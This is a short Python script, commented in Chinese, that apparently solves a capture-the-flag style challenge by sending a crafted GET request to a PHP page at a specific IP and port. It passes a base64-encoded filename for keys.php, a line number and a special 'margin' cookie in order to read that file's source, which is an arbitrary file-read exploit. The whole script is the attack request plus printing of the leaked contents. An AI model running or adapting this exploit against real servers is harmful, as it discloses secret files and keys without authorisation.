import requests

# 1. 配置请求参数
url = "http://171.80.2.169:18454/index.php"
params = {"line": 0, "filename": "a2V5cy5waHA="}  # 对应keys.php的base64编码
# 2. 配置Cookie（注意键名是margin，修正你的笔误magin）
cookies = {"margin": "margin"}

# 3. 发送GET请求
try:
    response = requests.get(
        url=url, params=params, cookies=cookies, timeout=10  # 超时时间10秒
    )
    # 4. 输出结果
    print("请求状态码：", response.status_code)
    print("响应内容（keys.php第0行）：", response.text)
except Exception as e:
    print("请求失败：", str(e))
